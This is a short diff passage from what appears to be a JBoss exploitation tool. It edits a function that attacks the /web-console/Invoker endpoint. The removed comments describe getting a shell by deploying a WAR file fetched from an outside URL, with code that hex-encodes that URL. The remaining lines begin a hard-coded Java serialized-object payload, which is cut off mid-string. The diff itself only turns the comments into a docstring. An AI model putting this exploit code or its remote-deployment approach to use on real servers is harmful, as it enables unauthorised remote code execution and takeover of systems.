@@ -345,12 +345,12 @@ def exploit_jmx_invoker_file_repository(url):
 
 
 def exploit_web_console_invoker(url):
-    # does not work in jboss5 (bug in jboss5)
-    # MainDeploy, shell in link
-    # /web-console/Invoker
-    # jsp = "http://www.joaomatosf.com/rnp/jbossass.war"
-    # jsp = "\\x".join("{:02x}".format(ord(c)) for c in jsp)
-    # jsp = "\\x" + jsp
+    """
+    Exploits web console invoker
+    Does not work in JBoss 5 (bug in JBoss5)
+    :param url: The URL to exploit
+    :return: The HTTP status code
+    """
     payload = ("\xac\xed\x00\x05\x73\x72\x00\x2e\x6f\x72\x67\x2e"
                "\x6a\x62\x6f\x73\x73\x2e\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x72\x65"
                "\x6d\x6f\x74\x65\x2e\x52\x65\x6d\x6f\x74\x65\x4d\x42\x65\x61\x6e"
